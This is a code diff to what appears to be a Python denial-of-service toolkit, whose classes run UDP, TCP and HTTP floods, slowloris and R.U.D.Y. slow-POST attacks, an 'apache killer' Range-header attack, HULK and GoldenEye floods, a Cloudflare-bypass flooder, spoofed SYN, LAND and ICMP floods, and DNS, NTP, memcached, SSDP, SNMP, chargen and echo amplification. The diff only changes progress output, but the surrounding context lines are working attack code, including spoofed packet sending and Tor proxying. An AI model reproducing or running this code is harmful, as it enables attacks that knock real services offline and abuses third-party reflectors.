@@ -95,6 +95,7 @@ def udp_flood(u,port=80,ports=None,interval=0.001,min_size=10,max_size=10,connec
   stop=False
   udp_counter=0
   tm=time.time()
+  size=0
   while (int(time.time()-tm)<=duration):
    try:
     if ports:
@@ -110,11 +111,13 @@ def udp_flood(u,port=80,ports=None,interval=0.001,min_size=10,max_size=10,connec
     if len(msg)>1400:
        msg=msg[0:1400]#make sure all payloads' sizes are on the right range
     s.sendto((msg.encode('utf-8')),(u,p))
+    size+=len(msg)
     udp_counter+=1
     if((logs==True) and (int(time.time()-tm)==1)):
-     sys.stdout.write("\rStats=> Packets sent: {}".format(udp_counter))
+     sys.stdout.write("\r[!]Packets: {} | Bytes/s: {}".format(udp_counter,size))
      sys.stdout.flush()
      tm=time.time()
+     size=0
     if limiting==True:
      time.sleep(interval)
    except KeyboardInterrupt:
@@ -163,7 +166,9 @@ class tcfld(threading.Thread):
        s.send(m.encode('utf-8'))
        tcp_counter+=1
        if prints==True:
-        print("[!]Packets: {} | Bytes: {}".format(tcp_counter,len(m)))
+        sys.stdout.write("\r[!]Packets: {} | Bytes: {}".format(tcp_counter,len(m)))
+        sys.stdout.flush()
+        #print("[!]Packets: {} | Bytes: {}".format(tcp_counter,len(m)))
       except Exception as dx:
        break
       time.sleep(self.speed)
@@ -237,7 +242,7 @@ def tcp_flood(u,p=80,min_size=10,max_size=50,threads=256,timeout=5,round_min=5,r
    stop=True
    break
  if logs==True:
-     print("[*]Killing all threads...")
+     print("\n[*]Killing all threads...\n")
  for x in thr:
     try:
       x.join(1)
@@ -245,7 +250,7 @@ def tcp_flood(u,p=80,min_size=10,max_size=50,threads=256,timeout=5,round_min=5,r
       pass
     del x
  if logs==True:
-     print("[*]Done!")
+     print("\n[*]Done!")
  if returning==True:
   return tcp_counter
 class htflood(threading.Thread):
@@ -323,7 +328,9 @@ class htflood(threading.Thread):
       s.send(m.encode('utf-8'))
       http_counter+=1
       if prints==True:
-       print("[!]Request: {} | Type: {} | Bytes: {}".format(http_counter,req,len(m)))
+        sys.stdout.write("\r[!]Request: {} | Type: {} | Bytes: {}".format(http_counter,req,len(m)))
+        sys.stdout.flush()
+        #print("[!]Request: {} | Type: {} | Bytes: {}".format(http_counter,req,len(m)))
      except :
       break
      time.sleep(self.speed)
@@ -519,7 +526,9 @@ class prflood(threading.Thread):
       s.send(m.encode('utf-8'))
       lulzer_counter+=1
       if prints==True:
-       print("[!]Bot: {} | Request: {} | Type: {} | Bytes: {}".format(ipp,lulzer_counter,req,len(m)))
+        sys.stdout.write("\r[!]Bot: {} | Request: {} | Type: {} | Bytes: {}".format(ipp,lulzer_counter,req,len(m)))
+        sys.stdout.flush()
+        #print("[!]Bot: {} | Request: {} | Type: {} | Bytes: {}".format(ipp,lulzer_counter,req,len(m)))
      except Exception as e:
       break
      time.sleep(self.speed)
@@ -647,7 +656,9 @@ class reqpost(threading.Thread):
      s.setproxy(socks.PROXY_TYPE_SOCKS5, '127.0.0.1' , 9050, True)
     s.connect((self.target,self.port))
     if prints==True:
-     print("Connected to {}:{}...".format(self.target,self.port))
+        sys.stdout.write("\rConnected to {}:{}...".format(self.target,self.port))
+        sys.stdout.flush()
+        #print("Connected to {}:{}...".format(self.target,self.port))
     if ((self.port==443) or (self.port==8443)):
      s=ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1)
     q=random.randint(self.mincontent,self.maxcontent)
@@ -659,7 +670,9 @@ class reqpost(threading.Thread):
      try:
       s.send(h.encode('utf-8'))
       if prints==True:
-       print("Posted: {}".format(h))
+        sys.stdout.write("\rPosted: {}".format(h))
+        sys.stdout.flush()
+        #print("Posted: {}".format(h))
       time.sleep(random.uniform(.1,3))
      except:
       break
@@ -783,7 +796,9 @@ class pham(threading.Thread):
      try:
       s.send(h.encode('utf-8'))
       if prints==True:
-       print("Posted: {} --> {}".format(h,ipp))
+        sys.stdout.write("\rPosted: {} --> {}".format(h,ipp))
+        sys.stdout.flush()
+        #print("Posted: {} --> {}".format(h,ipp))
       time.sleep(random.uniform(.1,3))
      except:
       break
@@ -893,7 +908,9 @@ class rudypost(threading.Thread):
      s.setproxy(socks.PROXY_TYPE_SOCKS5, '127.0.0.1' , 9050, True)
     s.connect((self.target,self.port))
     if prints==True:
-     print("Connected to {}:{}...".format(self.target,self.port))
+        sys.stdout.write("\rConnected to {}:{}...".format(self.target,self.port))
+        sys.stdout.flush()
+        #print("Connected to {}:{}...".format(self.target,self.port))
     if ((self.port==443) or (self.port==8443)):
      s=ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1)
     if self.form_lng<1:
@@ -910,7 +927,9 @@ class rudypost(threading.Thread):
      try:
       s.send(h.encode('utf-8'))
       if prints==True:
-       print("Posted: {}".format(h))
+        sys.stdout.write("\rPosted: {}".format(h))
+        sys.stdout.flush()
+        #print("Posted: {}".format(h))
       if self.r_wait<0:
        time.sleep(random.randint(self.r_min,self.r_max))
       else:
@@ -1272,7 +1291,9 @@ class slrd(threading.Thread):
        s.send("POST {} HTTP/1.1\r\nUser-Agent: {}\r\nAccept-language: en-US,en,q=0.5\r\nConnection: keep-alive\r\nKeep-Alive: {}\r\nContent-Length: {}\r\nContent-Type: application/x-www-form-urlencoded\r\nReferer: {}\r\nHost: {}\r\n\r\n{}".format(pa,random.choice(ua),random.randint(300,1000),len(q),(random.choice(referers)+random.choice(lis)+str(random.randint(0,100000000))+random.choice(lis)),self.target,q).encode('utf-8'))
       d=s.recv(random.randint(self.rre1,self.rre2))
       if prints==True:
-       print("Received: {}".format(str(d.decode('utf-8'))))
+        sys.stdout.write("\rReceived: {}".format(str(d.decode('utf-8'))))
+        sys.stdout.flush()
+        #print("Received: {}".format(str(d.decode('utf-8'))))
       time.sleep(random.randint(self.sre1,self.sre2))
      except:
       break
@@ -1386,7 +1407,9 @@ class apa(threading.Thread):
       s.send("GET {} HTTP/1.1\r\nHost: {}\r\nRange: bytes=0-,{}\r\nUser-Agent: {}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nConnection: keep-alive\r\nKeep-Alive: {}\r\nReferer: {}\r\n\r\n".format("/?"+str(random.randint(1,1000000))+str(random.randint(1,1000000)),self.target,apache,random.choice(ua),random.randint(100,1000),(random.choice(referers)+random.choice(lis)+str(random.randint(0,100000000))+random.choice(lis))).encode('utf-8'))
       apache_killer_counter+=1
       if prints==True:
-       print("Requests sent: {}".format(apache_killer_counter))
+        sys.stdout.write("\rRequests sent: {}".format(apache_killer_counter))
+        sys.stdout.flush()
+        #print("Requests sent: {}".format(apache_killer_counter))
      except:
       break
      time.sleep(self.speed)
@@ -1447,7 +1470,9 @@ class ptc(threading.Thread):
         q+=random.choice(lis)
        s.send("POST {} HTTP/1.1\r\nUser-Agent: {}\r\nAccept-language: en-US,en,q=0.5\r\nConnection: keep-alive\r\nKeep-Alive: {}\r\nContent-Length: {}\r\nContent-Type: application/x-www-form-urlencoded\r\nReferer: {}\r\nHost: {}\r\n\r\n{}".format(pa,random.choice(ua),random.randint(300,1000),len(q),(random.choice(referers)+random.choice(lis)+str(random.randint(0,100000000))+random.choice(lis)),self.target,q).encode('utf-8'))
       if prints==True:
-       print("Slow-->{}".format(ipp))
+        sys.stdout.write("\rSlow-->{}".format(ipp))
+        sys.stdout.flush()
+        #print("Slow-->{}".format(ipp))
       time.sleep(random.randint(self.sre1,self.sre2))
      except:
       break
@@ -1771,7 +1796,10 @@ class plor(threading.Thread):
     while (stop!=True):
      s.send("X-a: {}\r\n".format(random.randint(1,10000000)).encode("utf-8"))
      time.sleep(self.speed)
-     print("socket-->{}".format(ipp))
+     if prints==True:
+        sys.stdout.write("\rSocket-->{}".format(ipp))
+        sys.stdout.flush()
+        #print("socket-->{}".format(ipp))
    except:
     pass
   self.target=None
@@ -1877,7 +1905,9 @@ class phu(threading.Thread):
         break
     proxhulk_counter+=1
     if prints==True:
-     print("[!]Requests: {} | Bot: {}".format(proxhulk_counter,pr.split(':')[0]))
+        sys.stdout.write("\r[!]Requests: {} | Bot: {}".format(proxhulk_counter,pr.split(':')[0]))
+        sys.stdout.flush()
+        #print("[!]Requests: {} | Bot: {}".format(proxhulk_counter,pr.split(':')[0]))
    except Exception as e:
     pass
   self.target=None
@@ -1922,13 +1952,17 @@ class hu(threading.Thread):
         break
       hulk_counter+=1
       if prints==True:
-       print("Requests: {}".format(hulk_counter))
+        sys.stdout.write("\rRequests: {}".format(hulk_counter))
+        sys.stdout.flush()
+        #print("Requests: {}".format(hulk_counter))
      except urllib2.HTTPError as ex:
       if stop==True:
         break
       hulk_counter+=1
       if prints==True:
-       print("Requests: {}".format(hulk_counter))
+        sys.stdout.write("\rRequests: {}".format(hulk_counter))
+        sys.stdout.flush()
+        #print("Requests: {}".format(hulk_counter))
      except Exception as e:
       pass
   self.target=None
@@ -2185,7 +2219,9 @@ class sflood(threading.Thread):
     s.sendto(packet, (dip,self.port))
     synflood_counter+=1
     if prints==True:
-     print("[!]Packets: {} | IP: {} | Type: {} | Bytes: {}".format(synflood_counter,sip,req,leng))
+        sys.stdout.write("\r[!]Packets: {} | IP: {} | Type: {} | Bytes: {}".format(synflood_counter,sip,req,leng))
+        sys.stdout.flush()
+        #print("[!]Packets: {} | IP: {} | Type: {} | Bytes: {}".format(synflood_counter,sip,req,leng))
    except Exception as e:
     pass
    time.sleep(self.speed)
@@ -2371,7 +2407,9 @@ class udpsp(threading.Thread):
     s.sendto(packet,(self.target,self.port))
     udpstorm_counter+=1
     if prints==True:
-     print("[!]Packets: {} | IP: {} | Type: UDP | Bytes: {}".format(udpstorm_counter,sip,len(packet)))
+        sys.stdout.write("\r[!]Packets: {} | IP: {} | Type: UDP | Bytes: {}".format(udpstorm_counter,sip,len(packet)))
+        sys.stdout.flush()
+        #print("[!]Packets: {} | IP: {} | Type: UDP | Bytes: {}".format(udpstorm_counter,sip,len(packet)))
    except:
     pass
    time.sleep(self.speed)
@@ -2530,7 +2568,9 @@ class ln(threading.Thread):
     s.sendto(packet,(self.target,self.port))
     land_counter+=1
     if prints==True:
-     print("[!]Packets: {} | Type: {} | Bytes: {}".format(land_counter,req,len(urd)))
+        sys.stdout.write("\r[!]Packets: {} | Type: {} | Bytes: {}".format(land_counter,req,len(urd)))
+        sys.stdout.flush()
+        #print("[!]Packets: {} | Type: {} | Bytes: {}".format(land_counter,req,len(urd)))
    except Exception as e:
     pass
    time.sleep(self.speed)
@@ -2642,7 +2682,9 @@ class dampli(threading.Thread):
     s.sendto(packet,(ip,53))
     dnsamplif_counter+=1
     if prints==True:
-     print ("[!]Packets sent: {} | IP: {}".format(dnsamplif_counter,ip))
+        sys.stdout.write("\r[!]Packets sent: {} | IP: {}".format(dnsamplif_counter,ip))
+        sys.stdout.flush()
+        #print ("[!]Packets sent: {} | IP: {}".format(dnsamplif_counter,ip))
    except Exception as e:
     pass
    time.sleep(self.speed)
@@ -2745,7 +2787,9 @@ class nampli(threading.Thread):
     s.sendto(packet,(ip,123))
     ntpamplif_counter+=1
     if prints==True:
-     print ("[!]Packets sent: {} | IP: {}".format(ntpamplif_counter,ip))
+        sys.stdout.write("\r[!]Packets sent: {} | IP: {}".format(ntpamplif_counter,ip))
+        sys.stdout.flush()
+        #print ("[!]Packets sent: {} | IP: {}".format(ntpamplif_counter,ip))
    except Exception as e:
     pass
    time.sleep(self.speed)
@@ -2847,7 +2891,9 @@ class memampli(threading.Thread):
     s.sendto(packet,(ip,11211))
     memcacheamplif_counter+=1
     if prints==True:
-     print ("[!]Packets sent: {} | IP: {}".format(memcacheamplif_counter,ip))
+        sys.stdout.write("\r[!]Packets sent: {} | IP: {}".format(memcacheamplif_counter,ip))
+        sys.stdout.flush()
+        #print ("[!]Packets sent: {} | IP: {}".format(memcacheamplif_counter,ip))
    except Exception as e:
     pass
    time.sleep(self.speed)
@@ -2940,7 +2986,9 @@ class charampli(threading.Thread):
     s.sendto(packet,(ip,19))
     chargenamplif_counter+=1
     if prints==True:
-     print ("[!]Packets sent: {} | IP: {}".format(chargenamplif_counter,ip))
+        sys.stdout.write("\r[!]Packets sent: {} | IP: {}".format(chargenamplif_counter,ip))
+        sys.stdout.flush()
+        #print ("[!]Packets sent: {} | IP: {}".format(chargenamplif_counter,ip))
    except Exception as e:
     pass
    time.sleep(self.speed)
@@ -3033,7 +3081,9 @@ class ssampli(threading.Thread):
     s.sendto(packet,(ip,1900))
     ssdpamplif_counter+=1
     if prints==True:
-     print ("[!]Packets sent: {} | IP: {}".format(ssdpamplif_counter,ip))
+        sys.stdout.write("\r[!]Packets sent: {} | IP: {}".format(ssdpamplif_counter,ip))
+        sys.stdout.flush()
+        #print ("[!]Packets sent: {} | IP: {}".format(ssdpamplif_counter,ip))
    except Exception as e:
     pass
    time.sleep(self.speed)
@@ -3126,7 +3176,9 @@ class snampli(threading.Thread):
     s.sendto(packet,(ip,161))
     snmpamplif_counter+=1
     if prints==True:
-     print ("[!]Packets sent: {} | IP: {}".format(snmpamplif_counter,ip))
+        sys.stdout.write("\r[!]Packets sent: {} | IP: {}".format(snmpamplif_counter,ip))
+        sys.stdout.flush()
+        #print ("[!]Packets sent: {} | IP: {}".format(snmpamplif_counter,ip))
    except Exception as e:
     pass
    time.sleep(self.speed)
@@ -3226,7 +3278,9 @@ class echst(threading.Thread):
     s.sendto(packet,(ip,port))
     echo_ref_counter+=1
     if prints==True:
-     print("[!]Packets sent: {} | IP: {} | Bytes: {}".format(echo_ref_counter,ip,len(data)))
+        sys.stdout.write("\r[!]Packets sent: {} | IP: {} | Bytes: {}".format(echo_ref_counter,ip,len(data)))
+        sys.stdout.flush()
+        #print("[!]Packets sent: {} | IP: {} | Bytes: {}".format(echo_ref_counter,ip,len(data)))
    except Exception as e:
     pass
    time.sleep(self.speed)
@@ -3321,7 +3375,9 @@ class icmpcl(threading.Thread):
     s.sendto(packet,(self.target,self.port))
     icmp_counter+=1
     if prints==True:
-     print("[!]Packets sent: {} | Bytes: {}".format(icmp_counter,len(data)))
+        sys.stdout.write("\r[!]Packets sent: {} | Bytes: {}".format(icmp_counter,len(data)))
+        sys.stdout.flush()
+        #print("[!]Packets sent: {} | Bytes: {}".format(icmp_counter,len(data)))
    except Exception as e:
     pass
    time.sleep(self.speed)
@@ -3425,7 +3481,9 @@ class icmpst(threading.Thread):
     s.sendto(packet,(self.target,self.port))
     icmpstorm_counter+=1
     if prints==True:
-     print("[!]Packets sent: {} | IP: {} | Bytes: {}".format(icmpstorm_counter,sip,len(data)))
+        sys.stdout.write("\r[!]Packets sent: {} | IP: {} | Bytes: {}".format(icmpstorm_counter,sip,len(data)))
+        sys.stdout.flush()
+        #print("[!]Packets sent: {} | IP: {} | Bytes: {}".format(icmpstorm_counter,sip,len(data)))
    except Exception as e:
     pass
    time.sleep(self.speed)
@@ -3525,7 +3583,9 @@ class blnu(threading.Thread):
     s.sendto(packet,(self.target,self.port))
     blacknurse_counter+=1
     if prints==True:
-     print ("[!]Packets sent: {} | IP: {}".format(blacknurse_counter,sip))
+        sys.stdout.write("\r[!]Packets sent: {} | IP: {}".format(blacknurse_counter,sip))
+        sys.stdout.flush()
+        #print ("[!]Packets sent: {} | IP: {}".format(blacknurse_counter,sip))
    except Exception as e:
     pass
    time.sleep(self.speed)
@@ -3672,7 +3732,9 @@ class gldn(threading.Thread):
         break
     goldeneye_counter+=1
     if prints==True:
-     print("[!]Requests: {} | Type: {}".format(goldeneye_counter,req))
+        sys.stdout.write("\r[!]Requests: {} | Type: {}  ".format(goldeneye_counter,req))
+        sys.stdout.flush()
+        #print("[!]Requests: {} | Type: {}".format(goldeneye_counter,req))
    except Exception as e:
     pass
    time.sleep(.1)
@@ -3863,7 +3925,9 @@ class dosecl(threading.Thread):
         break
     doser_counter+=1
     if prints==True:
-     print("[!]Requests: {} | Type: {}".format(doser_counter,req))
+        sys.stdout.write("\r[!]Requests: {} | Type: {}".format(doser_counter,req))
+        sys.stdout.flush()
+        #print("[!]Requests: {} | Type: {}".format(doser_counter,req))
    except requests.exceptions.ReadTimeout:
     if stop==True:
         break
@@ -4004,12 +4068,17 @@ class prdose(threading.Thread):
     if stop==True:
         break
     proxdoser_counter+=1
-    print("[!]Requests: {} | Type: {} | Bot: {}".format(proxdoser_counter,req,pr.split('://')[1].split(':')[0]))
+    if prints==True:
+        sys.stdout.write("\r[!]Requests: {} | Type: {} | Bot: {}".format(proxdoser_counter,req,pr.split('://')[1].split(':')[0]))
+        sys.stdout.flush()
+        #print("[!]Requests: {} | Type: {} | Bot: {}".format(proxdoser_counter,req,pr.split('://')[1].split(':')[0]))
    except requests.exceptions.ReadTimeout:
     if stop==True:
         break
     proxdoser_counter+=1
-    print("[!]Requests: {} | Type: {} | Bot: {}".format(proxdoser_counter,req,pr.split('://')[1].split(':')[0]))
+    if prints==True:
+        sys.stdout.write("\r[!]Requests: {} | Type: {} | Bot: {}".format(proxdoser_counter,req,pr.split('://')[1].split(':')[0]))
+        sys.stdout.flush()
    except Exception as e:
     pass
    time.sleep(.1)
@@ -4116,19 +4185,25 @@ class atcf(threading.Thread):
       req=urllib2.urlopen(request,timeout=self.timeout)            
       cf_doser_counter+=1
       if prints==True:
-       print("Requests: {}".format(cf_doser_counter))
+        sys.stdout.write("\rRequests: {}".format(cf_doser_counter))
+        sys.stdout.flush()
+        #print("Requests: {}".format(cf_doser_counter))
      except urllib2.HTTPError as ex:
       if "Too Many Requests" in str(ex):
        stop=True
        break
       cf_doser_counter+=1
       if prints==True:
-       print("Requests: {}".format(cf_doser_counter))
+        sys.stdout.write("\rRequests: {}".format(cf_doser_counter))
+        sys.stdout.flush()
+        #print("Requests: {}".format(cf_doser_counter))
      except Exception as e:
       if "The read operation timed out" in str(e):
        cf_doser_counter+=1
        if prints==True:
-        print("Requests: {}".format(cf_doser_counter))
+        sys.stdout.write("\rRequests: {}".format(cf_doser_counter))
+        sys.stdout.flush()
+        #print("Requests: {}".format(cf_doser_counter))
   self.target=None
   self.timeout=None
 class cooi(threading.Thread):
@@ -4195,7 +4270,6 @@ def cf_kill_ua(u,threads=500,timeout=5,check_ua_protection=True,need_cookie=Fals
   x+=str(random.randint(1,1000000)*random.randint(1,1000000))+str(random.randint(1,1000000)*random.randint(1,1000000))+str(random.randint(1,1000000)*random.randint(1,1000000))
   ue.append(x)
  global coo
- coo=False
  coo=need_cookie
  if check_ua_protection==True:
   try:
